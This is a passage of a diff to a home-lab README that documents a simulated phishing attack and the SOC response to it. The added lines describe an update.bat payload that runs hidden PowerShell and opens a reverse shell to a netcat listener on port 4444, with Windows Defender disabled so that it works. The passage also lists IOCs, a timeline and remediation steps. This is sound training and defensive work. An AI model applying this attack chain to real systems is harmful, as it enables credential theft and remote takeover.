-- Return-Path it@lab.local did not match From address itsupport@domain.com — confirmed spoofing
-- pfSense firewall logs showed HTTP connection from LAN (victim) to OPT1 (attacker) on port 80
-- Wireshark captured HTTP POST request containing victim credentials in plain text
-- Splunk Sysmon EventID 3 detected outbound connection from Windows Server to 192.168.2.5
-- Splunk Security EventCode 4625 showed failed login attempts following the phishing click
+- GoPhish dashboard confirmed email sent, opened, link clicked, and credentials submitted
+- Attachment update.bat downloaded and executed by victim
+- Netcat on Kali received reverse shell connection from 192.168.1.1 on port 56118
+- MXToolbox confirmed No DMARC Record Found for update.com
+- SPF failed — no name servers found for lab.local
+- DKIM failed — No DKIM-Signature header found
+- From address Microsoft@update.com confirmed as spoofed
+- Return-Path it@lab.local did not match From address
+- X-Mailer header revealed gophish as the sending tool
+- Relay showed email sent from kali via mailhog.example
+- Link in email body pointed directly to malicious file http://192.168.2.5:8080/update.bat
+- pfSense logs showed LAN to OPT1 connections on ports 80, 8080, and 4444
+- Wireshark captured HTTP POST with credentials in plain text
+- Splunk Sysmon EventID 1 detected hidden PowerShell execution
+- Splunk Sysmon EventID 3 detected outbound connection to 192.168.2.5 port 4444
 
 #### Containment
 
-- pfSense LAN to OPT1 rules updated to block all traffic from victim machine immediately
-- Victim VM network adapter disabled in VirtualBox to fully isolate the machine
+- pfSense LAN rules updated to block all traffic from 192.168.1.1 immediately
+- Netcat session terminated on Kali
+- Victim VM network adapter disabled in VirtualBox
 - Attacker IP 192.168.2.5 blocked at pfSense firewall level
-- Phishing URL http://192.168.2.5 blocked using pfSense firewall rule
-- All active sessions on victim machine terminated
+- All active sessions on Windows Server terminated
 
 #### Eradication
 
-- Reviewed all processes on victim VM using Sysmon logs in Splunk
-- Checked Windows registry run keys for persistence mechanisms
-- Checked scheduled tasks for malicious entries
-- Verified no malware was dropped during simulation
-- Compromised credentials flagged for immediate reset
+- update.bat deleted from C:\Users\Administrator\Downloads
+- PowerShell execution policy reset to Restricted
+- Windows Defender re-enabled
+- Registry run keys checked for persistence
+- Scheduled tasks checked for malicious entries
+- Compromised credentials reset immediately
 
 #### Recovery
 
-- Victim VM snapshot restored to clean pre-attack state
-- pfSense firewall rules reviewed and tightened
-- Verified Sysmon and Splunk Forwarder still running after restore
-- Confirmed no attacker artifacts remained on the system
+- Windows Server VM snapshot restored to clean pre-attack state
+- pfSense firewall rules reviewed and port 4444 blocked permanently
+- Sysmon and Splunk Forwarder verified running after restore
 - Final Splunk search confirmed no further suspicious activity
-
----
-
-## Screenshots
-Firewall Rules
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 120844" src="https://github.com/user-attachments/assets/c4150dca-c82a-43f8-b213-54806ef6f7eb" />
-
-Inputs Configuration
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 115934" src="https://github.com/user-attachments/assets/db05a48f-9fd0-445b-9362-8ef4646b9cd6" />
-
-
-Gophish running on terminal
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-21 225230" src="https://github.com/user-attachments/assets/2bc41464-3931-4fde-a304-05deba7fc0c6" />
-
-Mailhug running on terminal
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-21 225204" src="https://github.com/user-attachments/assets/a757fda3-7b69-4352-aa4d-4ab71526ff3b" />
-
-Users and Groups
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 032338" src="https://github.com/user-attachments/assets/c1d6b70e-6672-47a5-8e1b-6d1bd7a1f2bd" />
-
-Email Template
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 032407" src="https://github.com/user-attachments/assets/5127178a-a7c1-4581-8964-ba8b772d1499" />
-
-Landing Page
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 032432" src="https://github.com/user-attachments/assets/cef156c8-7ca5-486a-b2ee-febfe23c453a" />
-
-Sending Profile
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 032454" src="https://github.com/user-attachments/assets/3c4564d3-f344-4dde-980c-99f6aec97424" />
-
-Attack Simulation 
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 014943" src="https://github.com/user-attachments/assets/8f43c812-e26f-4108-a588-a5ccba841b30" />
-
-Victim receives email
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 015016" src="https://github.com/user-attachments/assets/fb4eacd8-ca03-4e87-93ef-917fd46b1b29" />
-
-Victim Inputs Credentials
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-21 225805" src="https://github.com/user-attachments/assets/c963d9ca-cefc-461c-b43d-28167a1bd19b" />
-
-Phishing Attack Dashboard
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 015124" src="https://github.com/user-attachments/assets/55702f88-a59c-4526-ad84-cd46a413e871" />
-
-Gophish receives victims credentials
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 015225" src="https://github.com/user-attachments/assets/5fbe5f2d-a100-40f9-af56-f12986906bc0" />
-
-Analyzing email header
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 020814" src="https://github.com/user-attachments/assets/b3a505e5-389a-427e-b3fe-2f1df492dc3e" />
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 020841" src="https://github.com/user-attachments/assets/581c6a0b-6975-47d5-b9fc-295da4ab16b7" />
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 020859" src="https://github.com/user-attachments/assets/b5cf510b-1cc0-4b8e-b862-9798dead1840" />
-
-Wireshark Captures victims credentials
-
-<img width="1920" height="1080" alt="Screenshot 2026-05-22 015333" src="https://github.com/user-attachments/assets/1a71de4d-6538-4a89-bf74-a8a7fe326137" />
-
-
----
+- Windows Defender signatures updated
 
 #### Lessons Learned
 
-- HTTP credential submission is visible in plain text — HTTPS must be enforced on all services
-- SPF, DKIM, and DMARC failures are clear indicators of email spoofing
-- DMARC policy should be set to quarantine or reject — not none
-- pfSense network segmentation successfully isolated attacker and victim traffic
-- Sysmon EventID 3 is a reliable early indicator of phishing link clicks
-- X-Mailer header revealing gophish is a strong indicator of simulated phishing tooling
-- Correlating MXToolbox, pfSense, GoPhish, Wireshark, and Splunk gives a complete attack picture
-
------
-
-## Indicators of Compromise (IOCs)
-
-|Type             |Value                                   |
-|-----------------|----------------------------------------|
-|Attacker IP      |192.168.2.5                             |
-|Victim IP        |192.168.1.1                             |
-|Phishing URL     |http://192.168.2.5                      |
-|Email From       |itsupport@domain.com                    |
-|Email Return-Path|it@lab.local                            |
-|Email Subject    |Urgent - Your Password expires today    |
-|X-Mailer         |gophish                                 |
-|Sending Server   |kali via mailhog.example                |
-|SPF Result       |FAIL                                    |
-|DKIM Result      |FAIL — no signature                     |
-|DMARC Result     |FAIL — policy none                      |
-|Sysmon EventID   |3 — network connection to 192.168.2.5   |
-|pfSense Log      |HTTP pass LAN to OPT1 port 80           |
-|Wireshark        |HTTP POST with credentials in plain text|
-
------
-
-## Incident Timeline
-
-```
-T+00:00  GoPhish campaign launched from Kali (192.168.2.5)
-T+00:01  Phishing email delivered to victim via MailHog
-T+00:01  Email headers show X-Mailer: gophish
-T+00:02  Victim opens phishing email in browser
-T+00:02  Email headers extracted and analyzed in MXToolbox
-T+00:02  SPF, DKIM, DMARC all confirmed FAIL
-T+00:03  Victim clicks Reset My Password link
-T+00:03  pfSense logs HTTP connection LAN to OPT1 port 80
-T+00:03  HTTP POST detected in Wireshark
-T+00:03  Sysmon EventID 3 fires — connection to 192.168.2.5
-T+00:04  Credentials captured in GoPhish dashboard
-T+00:05  Splunk alert triggered — SOC investigation begins
-T+00:06  pfSense rule updated — victim traffic blocked
-T+00:07  Victim VM isolated from network
-T+00:08  Incident report documentation started
-```
-
------
-
-## Difficulties and Troubleshooting
-1. MailHog Inbox Empty
-GoPhish campaigns were launching successfully but no emails appeared in MailHog. After investigation, the Sending Profile Host was configured to port 8025 (web UI) instead of port 1025 (SMTP). Corrected the Host to 127.0.0.1:1025 and used swaks to manually send a test email to confirm MailHog was receiving before relaunching the campaign.
-
-2. Phishing Link Stopped Working After pfSense Was Added
-After segmenting the network with pfSense, clicking the phishing link on Windows Server returned no response. pfSense blocks all inter-interface traffic by default. Created explicit allow rules on pfSense permitting HTTP port 80 from OPT1 to LAN, MailHog port 8025, and Splunk Forwarder port 9997, which restored full connectivity.
-
-3. IP and Interface Misconfiguration
-Multiple campaign failures occurred because OPT1 and LAN interfaces were incorrectly mapped causing routing to break completely. Resolved by stopping all VMs, remapping interfaces correctly in pfSense, assigning static IPs to each machine, and verifying connectivity with ping before proceeding.
-
-4. No Suspicious Events in Splunk
-Splunk searches returned only normal Splunk Forwarder activity with no phishing-related events visible. The searches were being run before any simulation was triggered. Resolved by running a complete end-to-end campaign first — launching GoPhish, clicking the link on Windows Server, submitting credentials — then checking Splunk immediately after.
+- Spoofed Microsoft domain Microsoft@update.com was convincing to victim
+- No DMARC record on update.com allowed spoofed emails to pass unchallenged
+- Batch file attachments should be blocked at email gateway level
+- Links to executable files in emails should be blocked by web proxy
+- PowerShell execution policy should be set to Restricted on all endpoints
+- Port 4444 outbound should be blocked by default on all firewalls
+- Hidden PowerShell execution is a strong indicator of malicious post-phishing activity
+- Zero delay relay is a clear sign no legitimate mail server was used
 
 ---
 
-## Skills Demonstrated
+##  Indicators of Compromise (IOCs)
 
-- Network segmentation using pfSense with WAN, LAN, and OPT1 interfaces
+| Type | Value |
+|---|---|
+| Attacker IP | 192.168.2.5 (Kali — OPT1) |
+| Victim IP | 192.168.1.1 (Windows Server — LAN) |
+| pfSense OPT1 Gateway | 192.168.2.1 |
+| pfSense LAN Gateway | 192.168.1.2 |
+| Phishing URL | http://192.168.2.5 |
+| Malicious File URL | http://192.168.2.5:8080/update.bat |
+| Malicious File | update.bat |
+| Reverse Shell Port | 4444 |
+| Email From | Microsoft@update.com |
+| Email Return-Path | it@lab.local |
+| Email Subject | Urgent-Update |
+| Email To | servercis@lab.com |
+| X-Mailer | gophish |
+| Sending Server | kali via mailhog.example |
+| DMARC Result | No DMARC Record Found for update.com |
+| SPF Result | FAIL — no name servers for lab.local |
+| DKIM Result | FAIL — no DKIM-Signature header found |
+| Relay | from kali by mailhog.example — 0 seconds delay |
+| Sysmon EventID 1 | Hidden PowerShell execution |
+| Sysmon EventID 3 | Outbound connection to 192.168.2.5:4444 |
+| pfSense Log | LAN to OPT1 port 4444 — reverse shell confirmed |
+| Wireshark | HTTP POST credentials in plain text |
+
+---
+
+##  Incident Timeline
+
+```
+T+00:00  GoPhish campaign launched from Kali (192.168.2.5)
+T+00:01  Phishing email delivered to servercis@lab.com via MailHog
+T+00:01  Envelope sender Microsoft@update.com — spoofed domain
+T+00:01  Email sent from kali via mailhog.example — 0 second relay delay
+T+00:02  Victim opens phishing email on Windows Server (192.168.1.1)
+T+00:02  Email headers extracted and analyzed in MXToolbox
+T+00:02  No DMARC Record Found for update.com
+T+00:02  SPF FAIL — no name servers for lab.local
+T+00:02  DKIM FAIL — no signature found
+T+00:02  X-Mailer confirmed gophish
+T+00:03  Victim clicks link in email body
+T+00:03  pfSense logs HTTP connection LAN to OPT1 port 80
+T+00:04  Victim downloads update.bat from http://192.168.2.5:8080
+T+00:04  pfSense logs LAN to OPT1 connection on port 8080
+T+00:05  Victim executes update.bat on Windows Server
+T+00:05  PowerShell runs silently in hidden window
+T+00:05  Sysmon EventID 1 fires — hidden PowerShell detected
+T+00:05  Reverse shell connects to Kali port 4444
+T+00:05  Sysmon EventID 3 fires — outbound to 192.168.2.5:4444
+T+00:05  Netcat receives connection from 192.168.1.1:56118
+T+00:06  Attacker has full remote shell access to Windows Server
+T+00:07  Splunk alert triggered — SOC investigation begins
+T+00:08  pfSense rules updated — all Windows Server traffic blocked
+T+00:09  Victim VM isolated from network
+T+00:10  Incident report documentation started
+```
+
+---
+
+##  Challenges and Troubleshooting
+
+**1. MailHog Inbox Empty**
+GoPhish campaigns launched but no emails appeared in MailHog. The Sending Profile Host was set to port 8025 (web UI) instead of port 1025 (SMTP). Corrected the Host to 127.0.0.1:1025 and verified MailHog was running before every campaign launch.
+
+**2. Phishing Link Stopped Working After pfSense Integration**
+After segmenting the network with pfSense the phishing link stopped working on Windows Server. pfSense blocks all inter-interface traffic by default. Created explicit firewall rules allowing HTTP port 80, MailHog port 8025, file download port 8080, reverse shell port 4444, and Splunk Forwarder port 9997 from LAN to OPT1.
+
+**3. Bat File Created With Linux Heredoc Syntax**
+The malicious batch file was initially created on Kali using heredoc syntax which Windows CMD cannot interpret. Windows returned heredoc is not recognized as an internal or external command. Resolved by creating the bat file directly on Windows Server using Notepad and saving as All Files with .bat extension.
+
+**4. Reverse Shell Not Connecting**
+After downloading and running update.bat nothing appeared on the Kali netcat listener. Windows Defender was silently blocking the payload. Resolved by disabling Windows Defender real-time monitoring and ensuring pfSense firewall rules for port 4444 were correctly applied before executing the file.
+
+---
+
+##  Skills Demonstrated
+
+- Network segmentation using pfSense with WAN, OPT1, and LAN interfaces
 - Firewall rule creation and traffic blocking using pfSense
-- Phishing campaign setup and execution using GoPhish
-- Email header analysis and SPF DKIM DMARC inspection using MXToolbox
+- Phishing campaign setup and malicious attachment delivery using GoPhish
+- Reverse shell establishment using a custom batch file payload and Netcat
+- Email header forensics and SPF DKIM DMARC analysis using MXToolbox
 - Network traffic analysis and credential extraction using Wireshark
 - SIEM log ingestion and SPL query writing using Splunk
-- Windows endpoint telemetry using Sysmon
+- Windows endpoint telemetry and process monitoring using Sysmon
 - Incident response documentation using the PICERL framework
 - Isolated internal lab network configuration using VirtualBox
 
------
+---
 
-## Legal Disclaimer
+##  Legal Disclaimer
 
-> All simulations were performed exclusively within a personally owned and controlled isolated lab environment. Performing phishing simulations against real individuals or organizations without explicit written authorization is illegal and unethical.
+> All simulations were performed exclusively within a personally owned and controlled isolated lab environment. The reverse shell payload and phishing simulation were conducted solely for educational purposes. Performing these activities against real individuals or organizations without explicit written authorization is illegal and unethical.
 
------
+---
 
-## References
+##  References
 
 - [pfSense Documentation](https://docs.netgate.com/pfsense/en/latest)
 - [GoPhish Documentation](https://docs.getgophish.com)
@@ -873,7 +930,8 @@ Splunk searches returned only normal Splunk Forwarder activity with no phishing-
 - [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
 - [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
 - [MailHog](https://github.com/mailhog/MailHog)
+- [Netcat Documentation](https://linux.die.net/man/1/nc)
 
------
+---
 
 > Built as part of a hands-on cybersecurity skills development journey targeting a SOC Analyst role.
